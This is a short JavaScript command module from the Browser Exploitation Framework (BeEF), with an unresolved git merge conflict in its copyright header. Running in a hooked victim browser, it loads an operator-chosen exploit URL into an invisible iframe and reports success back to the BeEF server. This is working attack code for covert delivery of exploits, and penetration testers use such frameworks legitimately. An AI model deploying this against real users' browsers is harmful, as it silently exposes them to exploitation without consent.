//
<<<<<<< HEAD
// Copyright (c) 2006-2026Wade Alcorn - wade@bindshell.net
=======
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
>>>>>>> c308392cb3a7bf9025c661931b553d9835aacdcb
// Browser Exploitation Framework (BeEF) - https://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
	var url = '<%= @sploit_url %>';
	if (!/https?:\/\//i.test(url)) {
		beef.net.send("<%= @command_url %>", <%= @command_id %>, "error=invalid url");
		return;
	}
	var sploit = beef.dom.createInvisibleIframe();
        sploit.src = url;
	beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=IFrame Created!");
});
